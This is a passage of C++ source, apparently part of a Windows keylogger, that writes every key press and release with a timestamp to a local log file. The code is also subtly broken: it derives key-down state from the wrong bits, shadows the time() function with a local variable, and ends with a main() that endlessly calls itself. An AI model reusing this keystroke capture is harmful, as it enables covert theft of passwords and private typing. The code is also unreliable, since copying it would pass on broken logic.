            int key = msg.wParam;
            bool isKeyDown = (msg.wParam & 0x1) != 0;

            // Handle the key
            if (isKeyDown) {
                // Key pressed
                time_t time = time(0);
                ofstream logFile("keyboard_log.txt", ios::out | ios::app);
                logFile << "[" << time << "] KEYDOWN: " << static_cast<char>(key) << endl;
                logFile.close();
            } else {
                // Key released
                time_t time = time(0);
                ofstream logFile("keyboard_log.txt", ios::out | ios::app);
                logFile << "[" << time << "] KEYUP: " << static_cast<char>(key) << endl;
                logFile.close();
            }
        }
    }

    // Release the hook
    UnhookWindowsHook(hook);

    return 0;
}

// Main program execution
int main() {
    // Run the main function
    return main();
}
```

